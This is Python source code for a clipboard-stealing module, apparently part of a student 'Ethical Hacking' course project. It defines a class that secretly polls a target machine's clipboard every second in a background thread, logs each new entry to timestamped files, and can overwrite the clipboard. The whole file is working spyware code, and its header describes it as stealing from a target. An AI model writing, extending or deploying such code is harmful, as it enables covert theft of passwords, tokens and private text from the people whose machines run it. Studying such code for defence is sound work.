################################################
# Clipboard Stealer Feature                    #
# Class: DES484 Ethical Hacking                #
# WARNING: For Educational Purposes Only!      #
#                                              #
# This module monitors and steals clipboard    #
# content from the target machine              #
################################################

import os
import threading
import time
from datetime import datetime

# Try to import clipboard library
try:
    import pyperclip  # Library for clipboard access across platforms
    PYPERCLIP_AVAILABLE = True
except ImportError:
    PYPERCLIP_AVAILABLE = False
    print("[!] pyperclip not available. Install with: pip install pyperclip")


class ClipboardStealer:
    """Monitor and steal clipboard content"""
    
    def __init__(self, log_dir="logs/clipboard"):
        """
        Initialize clipboard stealer
        
        Args:
            log_dir: Directory where clipboard logs will be saved
        """
        # Directory to save clipboard logs
        self.log_dir = log_dir
        # Flag indicating if monitoring is active
        self.is_running = False
        # Background thread for monitoring clipboard
        self.monitor_thread = None
        # Last clipboard content seen (to detect changes)
        self.last_content = ""
        # Path to current log file
        self.log_file = None
        # How often to check clipboard (in seconds)
        self.check_interval = 1  # Check clipboard every 1 second
        
        # Create log directory if it doesn't exist
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        
        # Create log file with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(self.log_dir, f"clipboard_{timestamp}.txt")
    
    def start(self):
        """
        Start monitoring clipboard in background thread
        
        Creates a daemon thread that continuously monitors clipboard for changes.
        When content changes, it's automatically logged to file.
        
        Returns:
            Status message indicating success or error
        """
        if not PYPERCLIP_AVAILABLE:
            return "[!] Clipboard monitoring requires pyperclip. Install with: pip install pyperclip"
        
        if self.is_running:
            return "[!] Clipboard monitor is already running"
        
        self.is_running = True
        self.monitor_thread = threading.Thread(target=self._monitor_clipboard)
        self.monitor_thread.daemon = True  # Thread will exit when main program exits
        self.monitor_thread.start()
        
        return f"[+] Clipboard monitoring started. Logging to: {self.log_file}"
    
    def stop(self):
        """
        Stop monitoring clipboard
        
        Signals the monitoring thread to stop and waits for it to finish.
        
        Returns:
            Status message indicating success or error
        """
        if not self.is_running:
            return "[!] Clipboard monitor is not running"
        
        self.is_running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
        
        return "[+] Clipboard monitoring stopped"
    
    def _monitor_clipboard(self):
        """
        Monitor clipboard in background thread (internal method)
        
        Continuously checks clipboard for changes and logs new content.
        Runs until is_running flag is set to False.
        """
        try:
            # Get initial clipboard content
            self.last_content = pyperclip.paste()
            
            while self.is_running:
                try:
                    # Get current clipboard content
                    current_content = pyperclip.paste()
                    
                    # Check if content has changed and is not empty
                    if current_content != self.last_content and current_content.strip():
                        self._log_clipboard(current_content)
                        self.last_content = current_content
                    
                    # Wait before checking again
                    time.sleep(self.check_interval)
                    
                except Exception as e:
                    # Log error but continue monitoring
                    self._log_error(f"Error reading clipboard: {str(e)}")
                    time.sleep(self.check_interval)
        
        except Exception as e:
            self._log_error(f"Fatal error in clipboard monitor: {str(e)}")
            self.is_running = False
    
    def _log_clipboard(self, content):
        """
        Log clipboard content to file (internal method)
        
        Writes clipboard content with timestamp and formatting to log file.
        
        Args:
            content: Clipboard content to log
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Timestamp: {timestamp}\n")
                f.write(f"Length: {len(content)} characters\n")
                f.write(f"{'-'*60}\n")
                f.write(f"{content}\n")
                f.write(f"{'='*60}\n")
        
        except Exception as e:
            print(f"[!] Error logging clipboard: {e}")
    
    def _log_error(self, error_msg):
        """
        Log errors to file (internal method)
        
        Args:
            error_msg: Error message to log
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(f"\n[ERROR] {timestamp}: {error_msg}\n")
        
        except Exception as e:
            print(f"[!] Error logging error: {e}")
    
    def get_status(self):
        """Get current status of clipboard monitor"""
        status = {
            "running": self.is_running,
            "log_file": self.log_file,
            "check_interval": self.check_interval,
            "pyperclip_available": PYPERCLIP_AVAILABLE,
            "last_content_length": len(self.last_content) if self.last_content else 0
        }
        
        # Check if log file exists and get size
        if os.path.exists(self.log_file):
            status["log_size_bytes"] = os.path.getsize(self.log_file)
        else:
            status["log_size_bytes"] = 0
        
        return status
    
    def get_latest_clipboard(self):
        """Get the latest clipboard content without logging"""
        if not PYPERCLIP_AVAILABLE:
            return "[!] Clipboard access requires pyperclip"
        
        try:
            content = pyperclip.paste()
            if content.strip():
                return f"[+] Latest clipboard content ({len(content)} chars):\n{content}"
            else:
                return "[!] Clipboard is empty"
        except Exception as e:
            return f"[!] Error reading clipboard: {str(e)}"
    
    def set_clipboard(self, content):
        """Set clipboard content (for testing or manipulation)"""
        if not PYPERCLIP_AVAILABLE:
            return "[!] Clipboard access requires pyperclip"
        
        try:
            pyperclip.copy(content)
            return f"[+] Clipboard set to: {content[:50]}..." if len(content) > 50 else f"[+] Clipboard set to: {content}"
        except Exception as e:
            return f"[!] Error setting clipboard: {str(e)}"
    
    def clear_logs(self):
        """Clear clipboard logs"""
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
                
                # Create new log file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                self.log_file = os.path.join(self.log_dir, f"clipboard_{timestamp}.txt")
                
                return f"[+] Clipboard logs cleared. New log file: {self.log_file}"
            else:
                return "[!] No log file to clear"
        except Exception as e:
            return f"[!] Error clearing logs: {str(e)}"
    
    def list_logs(self):
        """List all clipboard log files"""
        try:
            if not os.path.exists(self.log_dir):
                return "[!] No clipboard log directory found"
            
            log_files = [f for f in os.listdir(self.log_dir) if f.endswith('.txt')]
            
            if not log_files:
                return "[!] No clipboard log files found"
            
            result = "[+] Clipboard log files:\n"
            for log in sorted(log_files):
                full_path = os.path.join(self.log_dir, log)
                size = os.path.getsize(full_path)
                result += f"  - {log} ({size} bytes)\n"
            
            return result
        except Exception as e:
            return f"[!] Error listing logs: {str(e)}"


class FallbackClipboardStealer:
    """Fallback clipboard stealer when pyperclip is not available"""
    
    def __init__(self, log_dir="logs/clipboard"):
        self.log_dir = log_dir
        
    def start(self):
        return "[!] Clipboard monitoring requires pyperclip. Install with: pip install pyperclip"
    
    def stop(self):
        return "[!] Clipboard monitoring not available"
    
    def get_status(self):
        return {
            "running": False,
            "pyperclip_available": False,
            "error": "pyperclip not installed"
        }
    
    def get_latest_clipboard(self):
        return "[!] Clipboard access requires pyperclip"
    
    def set_clipboard(self, content):
        return "[!] Clipboard access requires pyperclip"
    
    def clear_logs(self):
        return "[!] Clipboard monitoring not available"
    
    def list_logs(self):
        return "[!] Clipboard monitoring not available"
